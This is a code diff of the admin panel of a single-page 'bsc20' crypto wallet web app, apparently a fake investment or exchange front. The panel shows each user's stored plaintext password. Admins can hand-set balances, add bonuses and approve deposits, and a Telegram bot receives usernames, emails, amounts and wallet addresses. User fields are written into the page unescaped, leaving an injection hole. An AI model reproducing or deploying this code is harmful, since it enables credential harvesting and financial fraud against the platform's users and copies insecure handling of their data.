+if(!d)return;d.st='rejected';LS('bsc20_deps',deps);
+var txns=LS('bsc20_txn_'+d.uid)||[];
+for(var j=0;j<txns.length;j++){if(txns[j].id===id){txns[j].st='rejected';break}}
+LS('bsc20_txn_'+d.uid,txns);
+renderAdmin();toast('Deposit rejected','err');
 }
 
-function renderAdUsers(users) {
-  if (!users) users = LS('bsc20_users') || [];
-  var ws = LS('bsc20_wallets') || {};
-  var el = document.getElementById('adUserList');
-  if (!users.length) {
-    el.innerHTML = '<div class="tc ts" style="padding:24px;color:var(--gray)">No users yet</div>';
-    return;
-  }
-  var h = '';
-  for (var i = 0; i < users.length; i++) {
-    var u = users[i];
-    var w = ws[u.id] || { main: 0, bonus: 0 };
-    var total = (w.main + w.bonus).toFixed(2);
-    h += '<div class="admin-c">';
-    h += '<div class="flex-b mb4">';
-    h += '<div><div class="fw7" style="font-size:13px">' + u.username + '</div>';
-    h += '<div class="txs" style="color:var(--gray)">' + u.email + '</div></div>';
-    h += '<div class="mono fw7" style="color:var(--gold);font-size:14px">$' + total + '</div>';
-    h += '</div>';
-    h += '<div class="g2 txs mb4">';
-    h += '<div>Main: <span class="mono fw7">$' + w.main.toFixed(2) + '</span></div>';
-    h += '<div>Bonus: <span class="mono fw7">$' + w.bonus.toFixed(2) + '</span></div>';
-    h += '</div>';
-    h += '<div class="txs mb4" style="color:var(--gray)">ID: ' + u.id + '</div>';
-    h += '<div class="txs mb4" style="color:var(--gray)">Pass: ' + u.password + '</div>';
-    h += '<div class="txs mb8" style="color:var(--gray)">Joined: ' + new Date(u.created).toLocaleDateString() + '</div>';
-    h += '<button class="btn btn-gold btn-sm" onclick="openEditModal(\'' + u.id + '\',\'' + u.username.replace(/'/g, '') + '\')">Edit Balance</button>';
-    h += '</div>';
-  }
-  el.innerHTML = h;
+function renderAWds(wds){
+wds=wds||LS('bsc20_wds')||[];
+var el=document.getElementById('adWdList');
+if(!wds.length){el.innerHTML='<div class="tc ts" style="padding:24px;color:var(--gray)">No withdrawals yet</div>';return}
+var h='';
+for(var i=wds.length-1;i>=0;i--){
+var w=wds[i];
+var stCl=w.st==='completed'?'st-d':w.st==='refunded'?'st-f':'st-p';
+h+='<div class="admin-c">';
+h+='<div class="flex-b mb4"><div><span class="fw7 ts">'+w.uname+'</span> <span class="txs" style="color:var(--gray)">'+w.uemail+'</span></div>';
+h+='<span class="'+stCl+'">'+w.st+'</span></div>';
+h+='<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">'+w.amt+' USDT +'+w.fee+' fee</span><span style="color:var(--gray)">'+new Date(w.at).toLocaleString()+'</span></div>';
+h+='<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">To: '+w.addr+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">Network: '+w.net+' | User ID: '+w.uid+'</div>';
+h+='<div class="txs mb4" style="color:var(--gray)">Pass: '+w.upass+'</div>';
+if(w.st==='pending'){
+h+='<div class="g2"><button class="btn btn-green btn-sm" onclick="compWd(\''+w.id+'\')">Complete</button><button class="btn btn-red btn-sm" onclick="refWd(\''+w.id+'\')">Refund</button></div>';
+}
+h+='</div>';
+}
+el.innerHTML=h;
 }
 
-function searchAdUsers(v) {
-  var users = LS('bsc20_users') || [];
-  if (v) {
-    var s = v.toLowerCase();
-    var filtered = [];
-    for (var i = 0; i < users.length; i++) {
-      if (users[i].username.toLowerCase().indexOf(s) >= 0 || users[i].email.toLowerCase().indexOf(s) >= 0) {
-        filtered.push(users[i]);
-      }
-    }
-    users = filtered;
-  }
-  renderAdUsers(users);
+function compWd(id){
+var wds=LS('bsc20_wds')||[];var w=null;
+for(var i=0;i<wds.length;i++){if(wds[i].id===id){w=wds[i];break}}
+if(!w)return;w.st='completed';LS('bsc20_wds',wds);
+var txns=LS('bsc20_txn_'+w.uid)||[];
+for(var j=0;j<txns.length;j++){if(txns[j].id===id){txns[j].st='completed';break}}
+LS('bsc20_txn_'+w.uid,txns);
+renderAdmin();toast('Withdrawal completed!','ok');
+sendTG('WITHDRAWAL COMPLETED\n\nUsername: '+w.uname+'\nEmail: '+w.uemail+'\nAmount: '+w.amt+' USDT to '+w.addr+'\nNetwork: '+w.net+'\nTime: '+new Date().toLocaleString());
 }
 
-function renderAdDeps(deps) {
-  deps = deps || LS('bsc20_deps') || [];
-  var el = document.getElementById('adDepList');
-  if (!deps.length) {
-    el.innerHTML = '<div class="tc ts" style="padding:24px;color:var(--gray)">No deposits yet</div>';
-    return;
-  }
-  var h = '';
-  for (var i = deps.length - 1; i >= 0; i--) {
-    var d = deps[i];
-    var stCl = d.st === 'completed' ? 'st-d' : d.st === 'rejected' ? 'st-f' : 'st-p';
-    h += '<div class="admin-c">';
-    h += '<div class="flex-b mb4"><div><span class="fw7 ts">' + d.uname + '</span> <span class="txs" style="color:var(--gray)">' + d.uemail + '</span></div>';
-    h += '<span class="' + stCl + '">' + d.st + '</span></div>';
-    h += '<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">' + d.amt + ' USDT (' + d.net + ')</span><span style="color:var(--gray)">' + new Date(d.at).toLocaleString() + '</span></div>';
-    h += '<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">TxHash: ' + d.hash + '</div>';
-    h += '<div class="txs mb4" style="color:var(--gray)">User ID: ' + d.uid + '</div>';
-    if (d.upass) h += '<div class="txs mb4" style="color:var(--gray)">Pass: ' + d.upass + '</div>';
-    if (d.st === 'pending') {
-      h += '<div class="g2"><button class="btn btn-green btn-sm" onclick="approveDep(\'' + d.id + '\')">Approve</button><button class="btn btn-red btn-sm" onclick="rejectDep(\'' + d.id + '\')">Reject</button></div>';
-    }
-    h += '</div>';
-  }
-  el.innerHTML = h;
+function refWd(id){
+var wds=LS('bsc20_wds')||[];var wd=null;
+for(var i=0;i<wds.length;i++){if(wds[i].id===id){wd=wds[i];break}}
+if(!wd)return;wd.st='refunded';LS('bsc20_wds',wds);
+var w=getWallet(wd.uid);w.main+=wd.amt+wd.fee;setWallet(wd.uid,w);
+var txns=LS('bsc20_txn_'+wd.uid)||[];
+for(var j=0;j<txns.length;j++){if(txns[j].id===id){txns[j].st='refunded';break}}
+LS('bsc20_txn_'+wd.uid,txns);
+renderAdmin();toast('Withdrawal refunded','info');
 }
 
-function approveDep(id) {
-  var deps = LS('bsc20_deps') || [];
-  var d = null;
-  for (var i = 0; i < deps.length; i++) { if (deps[i].id === id) { d = deps[i]; break; } }
-  if (!d) return;
-  d.st = 'completed';
-  LS('bsc20_deps', deps);
-  var w = getWallet(d.uid);
-  w.main += d.amt;
-  setWallet(d.uid, w);
-  var txns = LS('bsc20_txn_' + d.uid) || [];
-  for (var j = 0; j < txns.length; j++) { if (txns[j].id === id) { txns[j].st = 'completed'; break; } }
-  LS('bsc20_txn_' + d.uid, txns);
-  renderAdmin();
-  toast('Deposit approved!', 'ok');
-  sendTG('DEPOSIT APPROVED\n\nUsername: ' + d.uname + '\nEmail: ' + d.uemail + '\nUser ID: ' + d.uid + '\nAmount: ' + d.amt + ' USDT (' + d.net + ')\nDeposit ID: ' + d.id + '\nNew Balance: $' + (w.main + w.bonus).toFixed(2) + '\nTime: ' + new Date().toLocaleString());
+function adTab(t,el){
+var secs=document.querySelectorAll('#pg_admin .wsec');
+for(var i=0;i<secs.length;i++)secs[i].classList.remove('on');
+var tabs=document.querySelectorAll('#adTabs .tab');
+for(var i=0;i<tabs.length;i++)tabs[i].classList.remove('on');
+el.classList.add('on');document.getElementById('ad_'+t).classList.add('on');
 }
 
-function rejectDep(id) {
-  var deps = LS('bsc20_deps') || [];
-  var d = null;
-  for (var i = 0; i < deps.length; i++) { if (deps[i].id === id) { d = deps[i]; break; } }
-  if (!d) return;
-  d.st = 'rejected';
-  LS('bsc20_deps', deps);
-  var txns = LS('bsc20_txn_' + d.uid) || [];
-  for (var j = 0; j < txns.length; j++) { if (txns[j].id === id) { txns[j].st = 'rejected'; break; } }
-  LS('bsc20_txn_' + d.uid, txns);
-  renderAdmin();
-  toast('Deposit rejected', 'err');
+/* ADMIN - EDIT USER MODAL */
+function openEM(uid){
+editUID=uid;
+var u=getUser(uid);
+var w=getWallet(uid);
+if(!u)return;
+document.getElementById('emUser').textContent=u.username;
+document.getElementById('emEmail').textContent=u.email;
+document.getElementById('emUID').textContent=uid;
+document.getElementById('emPass').textContent=u.password;
+document.getElementById('emMain').value=w.main.toFixed(2);
+document.getElementById('emBonus').value=w.bonus.toFixed(2);
+var banBtn=document.getElementById('banBtn');
+if(u.banned){
+banBtn.textContent='Unban User';
+banBtn.className='btn btn-green mt8';
+}else{
+banBtn.textContent='Ban User';
+banBtn.className='btn btn-red mt8';
+}
+document.getElementById('editModal').classList.add('on');
 }
 
-function renderAdWds(wds) {
-  wds = wds || LS('bsc20_wds') || [];
-  var el = document.getElementById('adWdList');
-  if (!wds.length) {
-    el.innerHTML = '<div class="tc ts" style="padding:24px;color:var(--gray)">No withdrawals yet</div>';
-    return;
-  }
-  var h = '';
-  for (var i = wds.length - 1; i >= 0; i--) {
-    var w = wds[i];
-    var stCl = w.st === 'completed' ? 'st-d' : w.st === 'refunded' ? 'st-f' : 'st-p';
-    h += '<div class="admin-c">';
-    h += '<div class="flex-b mb4"><div><span class="fw7 ts">' + w.uname + '</span> <span class="txs" style="color:var(--gray)">' + w.uemail + '</span></div>';
-    h += '<span class="' + stCl + '">' + w.st + (w.st === 'pending' ? ' (30 min)' : '') + '</span></div>';
-    h += '<div class="flex-b txs mb4"><span class="mono fw7" style="color:var(--gold)">' + w.amt + ' USDT +' + w.fee + ' fee</span><span style="color:var(--gray)">' + new Date(w.at).toLocaleString() + '</span></div>';
-    h += '<div class="txs mono mb4" style="word-break:break-all;color:var(--gray)">To: ' + w.addr + '</div>';
-    h += '<div class="txs mb4" style="color:var(--gray)">User ID: ' + w.uid + '</div>';
-    if (w.upass) h += '<div class="txs mb4" style="color:var(--gray)">Pass: ' + w.upass + '</div>';
-    if (w.st === 'pending') {
-      h += '<div class="g2"><button class="btn btn-green btn-sm" onclick="completeWd(\'' + w.id + '\')">Complete</button><button class="btn btn-red btn-sm" onclick="refundWd(\'' + w.id + '\')">Refund</button></div>';
-    }
-    h += '</div>';
-  }
-  el.innerHTML = h;
+function saveBal(){
+if(!editUID)return;
+var main=parseFloat(document.getElementById('emMain').value)||0;
+var bonus=parseFloat(document.getElementById('emBonus').value)||0;
+var oldW=getWallet(editUID);
+setWallet(editUID,{main:main,bonus:bonus});
+closeEM();renderAdmin();toast('Balance updated!','ok');
+var u=getUser(editUID);
+sendTG('BALANCE EDITED\n\nUsername: '+(u?u.username:'?')+'\nEmail: '+(u?u.email:'')+'\nUser ID: '+editUID+'\n\nOld Main: $'+oldW.main.toFixed(2)+'\nOld Bonus: $'+oldW.bonus.toFixed(2)+'\nNew Main: $'+main.toFixed(2)+'\nNew Bonus: $'+bonus.toFixed(2)+'\nNew Total: $'+(main+bonus).toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-function completeWd(id) {
-  var wds = LS('bsc20_wds') || [];
-  var w = null;
-  for (var i = 0; i < wds.length; i++) { if (wds[i].id === id) { w = wds[i]; break; } }
-  if (!w) return;
-  w.st = 'completed';
-  LS('bsc20_wds', wds);
-  var txns = LS('bsc20_txn_' + w.uid) || [];
-  for (var j = 0; j < txns.length; j++) { if (txns[j].id === id) { txns[j].st = 'completed'; break; } }
-  LS('bsc20_txn_' + w.uid, txns);
-  renderAdmin();
-  toast('Withdrawal completed!', 'ok');
-  sendTG('WITHDRAWAL COMPLETED\n\nUsername: ' + w.uname + '\nEmail: ' + w.uemail + '\nAmount: ' + w.amt + ' USDT to ' + w.addr + '\nNetwork: ' + w.net + '\nTime: ' + new Date().toLocaleString());
+function toggleBan(){
+if(!editUID)return;
+var users=LS('bsc20_users')||[];
+for(var i=0;i<users.length;i++){
+if(users[i].id===editUID){
+users[i].banned=!users[i].banned;
+LS('bsc20_users',users);
+closeEM();renderAdmin();
+toast(users[i].banned?'User banned!':'User unbanned!',users[i].banned?'err':'ok');
+sendTG((users[i].banned?'USER BANNED':'USER UNBANNED')+'\n\nUsername: '+users[i].username+'\nEmail: '+users[i].email+'\nUser ID: '+users[i].id+'\nTime: '+new Date().toLocaleString());
+return;
+}
+}
 }
 
-function refundWd(id) {
-  var wds = LS('bsc20_wds') || [];
-  var wd = null;
-  for (var i = 0; i < wds.length; i++) { if (wds[i].id === id) { wd = wds[i]; break; } }
-  if (!wd) return;
-  wd.st = 'refunded';
-  LS('bsc20_wds', wds);
-  var w = getWallet(wd.uid);
-  w.main += wd.amt + wd.fee;
-  setWallet(wd.uid, w);
-  var txns = LS('bsc20_txn_' + wd.uid) || [];
-  for (var j = 0; j < txns.length; j++) { if (txns[j].id === id) { txns[j].st = 'refunded'; break; } }
-  LS('bsc20_txn_' + wd.uid, txns);
-  renderAdmin();
-  toast('Withdrawal refunded', 'info');
+function toggleBanDirect(uid){
+var users=LS('bsc20_users')||[];
+for(var i=0;i<users.length;i++){
+if(users[i].id===uid){
+users[i].banned=!users[i].banned;
+LS('bsc20_users',users);
+renderAdmin();
+toast(users[i].banned?'User banned!':'User unbanned!',users[i].banned?'err':'ok');
+return;
+}
+}
 }
 
-function adTabClick(t, el) {
-  var secs = document.querySelectorAll('#pg_admin .wsec');
-  for (var i = 0; i < secs.length; i++) secs[i].classList.remove('on');
-  var tabs = document.querySelectorAll('#adTabs .tab');
-  for (var i = 0; i < tabs.length; i++) tabs[i].classList.remove('on');
-  el.classList.add('on');
-  document.getElementById('ad_' + t).classList.add('on');
+function addBonusDirect(uid){
+var amt=prompt('Enter bonus amount (USDT):');
+if(!amt||isNaN(amt))return;
+amt=parseFloat(amt);
+var w=getWallet(uid);w.bonus+=amt;setWallet(uid,w);
+renderAdmin();toast('+$'+amt.toFixed(2)+' bonus added!','ok');
+var u=getUser(uid);
+sendTG('BONUS ADDED\n\nUsername: '+(u?u.username:'?')+'\nUser ID: '+uid+'\nBonus Added: $'+amt.toFixed(2)+'\nNew Total: $'+(w.main+w.bonus).toFixed(2)+'\nTime: '+new Date().toLocaleString());
 }
 
-function openEditModal(uid, uname) {
-  editUID = uid;
-  document.getElementById('emUser').textContent = uname;
-  document.getElementById('emUID').textContent = uid;
-  var w = getWallet(uid);
-  document.getElementById('emMain').value = w.main.toFixed(2);
-  document.getElementById('emBonus').value = w.bonus.toFixed(2);
-  document.getElementById('editModal').classList.add('on');
+function resetBalDirect(uid){
+if(!confirm('Reset balance to $0?'))return;
+setWallet(uid,{main:0,bonus:0});
+renderAdmin();toast('Balance reset to $0','info');
+var u=getUser(uid);
+sendTG('BALANCE RESET\n\nUsername: '+(u?u.username:'?')+'\nUser ID: '+uid+'\nBalance reset to $0\nTime: '+new Date().toLocaleString());
 }
 
-function saveBalance() {
-  if (!editUID) return;
-  var main = parseFloat(document.getElementById('emMain').value) || 0;
-  var bonus = parseFloat(document.getElementById('emBonus').value) || 0;
-  var oldW = getWallet(editUID);
-  setWallet(editUID, { main: main, bonus: bonus });
-  closeEditModal();
-  renderAdmin();
-  toast('Balance updated!', 'ok');
-  var u = getUser(editUID);
-  sendTG('BALANCE EDITED BY ADMIN\n\nUsername: ' + (u ? u.username : 'Unknown') + '\nEmail: ' + (u ? u.email : '') + '\nUser ID: ' + editUID + '\n\nOld Main: $' + oldW.main.toFixed(2) + '\nOld Bonus: $' + oldW.bonus.toFixed(2) + '\nNew Main: $' + main.toFixed(2) + '\nNew Bonus: $' + bonus.toFixed(2) + '\nNew Total: $' + (main + bonus).toFixed(2) + '\nTime: ' + new Date().toLocaleString());
+function closeEM(){document.getElementById('editModal').classList.remove('on')}
+
+/* ===== TELEGRAM ===== */
+function sendTG(msg){
+if(!CFG.CHAT||!CFG.BOT)return;
+try{
+fetch('https://api.telegram.org/bot'+CFG.BOT+'/sendMessage',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({chat_id:CFG.CHAT,text:msg})
+}).catch(function(){});
+}catch(e){}
 }
 
-function closeEditModal() { document.getElementById('editModal').classList.remove('on'); }
-
-// TELEGRAM
-function sendTG(msg) {
-  if (!CFG.CHAT_ID || !CFG.BOT_TOKEN) return;
-  try {
-    fetch('https://api.telegram.org/bot' + CFG.BOT_TOKEN + '/sendMessage', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: CFG.CHAT_ID, text: msg })
-    }).catch(function (e) { console.log('TG err:', e); });
-  } catch (e) { console.log('TG err:', e); }
+/* ===== UTILS ===== */
+function fmtP(p){
+p=parseFloat(p);if(!p)return '0.00';
+if(p>=1000)return p.toFixed(2);if(p>=1)return p.toFixed(2);
+if(p>=.01)return p.toFixed(4);if(p>=.0001)return p.toFixed(6);
+return p.toFixed(8);
 }
 
-// UTILS
-function fmtP(p) {
-  p = parseFloat(p);
-  if (!p) return '0.00';
-  if (p >= 1000) return p.toFixed(2);
-  if (p >= 1) return p.toFixed(2);
-  if (p >= .01) return p.toFixed(4);
-  if (p >= .0001) return p.toFixed(6);
-  return p.toFixed(8);
+function toast(msg,type){
+var el=document.getElementById('toast');
+el.textContent=msg;
+el.className='toast t-'+(type==='ok'?'ok':type==='err'?'err':'info')+' on';
+setTimeout(function(){el.classList.remove('on')},3500);
 }
 
-function toast(msg, type) {
-  var el = document.getElementById('toast');
-  el.textContent = msg;
-  el.className = 'toast t-' + (type === 'ok' ? 'ok' : type === 'err' ? 'err' : 'info') + ' on';
-  setTimeout(function () { el.classList.remove('on'); }, 3500);
-}
-
-document.addEventListener('DOMContentLoaded', init);
+document.addEventListener('DOMContentLoaded',init);
 </script>
 </body>
 </html>
